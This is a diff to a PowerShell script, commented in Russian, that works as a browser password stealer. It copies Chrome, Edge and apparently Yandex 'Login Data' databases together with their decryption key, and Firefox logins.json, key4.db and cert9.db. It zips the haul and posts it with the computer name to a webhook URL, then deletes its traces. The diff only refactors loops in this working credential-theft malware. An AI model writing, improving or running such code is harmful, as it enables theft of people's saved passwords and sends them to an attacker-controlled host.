@@ -6,6 +6,7 @@ $logPath = "$tempDir\report.log"
 
 Add-Type -AssemblyName System.Security
 
+# Функция дешифровки
 function Get-Key($statePath, $label) {
     if (Test-Path $statePath) {
         try {
@@ -19,7 +20,7 @@ function Get-Key($statePath, $label) {
     return $false
 }
 
-# 1. CHROMIUM
+# 1. CHROMIUM (Chrome, Edge, Yandex)
 $browsers = @(
     @{name="Chrome"; path="Google\Chrome\User Data"},
     @{name="Edge"; path="Microsoft\Edge\User Data"},
@@ -29,27 +30,28 @@ $browsers = @(
 foreach ($b in $browsers) {
     $userData = Join-Path $env:LOCALAPPDATA $b.path
     if (Test-Path $userData) {
-        Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
-            $currentFile = $_
-            $label = "$($b.name)_$($currentFile.Directory.Name)"
-            if (Get-Key (Join-Path $userData "Local State") $label) {
-                Copy-Item $currentFile.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
+        $files = Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
+        foreach ($f in $files) {
+            $label = "$($b.name)_$($f.Directory.Name)"
+            $state = Join-Path $userData "Local State"
+            if (Get-Key $state $label) {
+                Copy-Item $f.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
             }
         }
     }
 }
 
-# 2. FIREFOX (Исправленный блок)
-$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-if (Test-Path $ffPath) {
-    Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-        $profile = $_ # Сохраняем объект профиля, чтобы он не затерялся
+# 2. FIREFOX (Исправленный блок без переменных $_)
+$ffRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $ffRoot) {
+    $profiles = Get-ChildItem -Path $ffRoot -Directory
+    foreach ($profile in $profiles) {
         $label = "FF_$($profile.Name)"
-        "logins.json", "key4.db", "cert9.db" | ForEach-Object {
-            $fileName = $_ # Это имя файла (напр. logins.json)
-            $f = Join-Path $profile.FullName $fileName # Теперь тут точно не будет NULL
-            if (Test-Path $f) { 
-                Copy-Item $f -Destination "$tempDir\$($label)_$fileName" -Force -ErrorAction SilentlyContinue 
+        $targets = @("logins.json", "key4.db", "cert9.db")
+        foreach ($target in $targets) {
+            $fullPath = Join-Path $profile.FullName $target
+            if (Test-Path $fullPath) {
+                Copy-Item $fullPath -Destination "$tempDir\$($label)_$target" -Force -ErrorAction SilentlyContinue
             }
         }
     }
@@ -67,10 +69,13 @@ if ((Get-ChildItem $tempDir).Count -gt 0) {
         $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
         $content.Add($fileContent, "file", "report.zip")
         $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME")), "content")
+        
         $response = $client.PostAsync($hookUrl, $content).Result
+        
         $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
     } catch {}
 
     if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
 }
+
 Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
